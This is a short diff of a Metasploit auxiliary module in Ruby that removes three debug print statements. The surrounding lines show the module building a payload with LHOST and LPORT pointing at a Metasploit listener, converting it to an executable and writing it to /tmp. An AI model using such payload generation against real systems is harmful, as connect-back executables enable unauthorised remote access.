@@ -100,9 +100,6 @@ class Metasploit3 < Msf::Auxiliary
 						'Options' => { "LHOST"=>msf_ip, "LPORT"=>msf_port }
 					)
 				exe = Msf::Util::EXE.to_executable(framework, mod.arch, mod.platform, buf)
-				p mod
-				p mod.arch
-				p mod.platform
 				print_status("Writing payload to #{msf_filename}")
 				File.open("/tmp/#{msf_filename}", "wb") do |f|
 					f.write(exe)
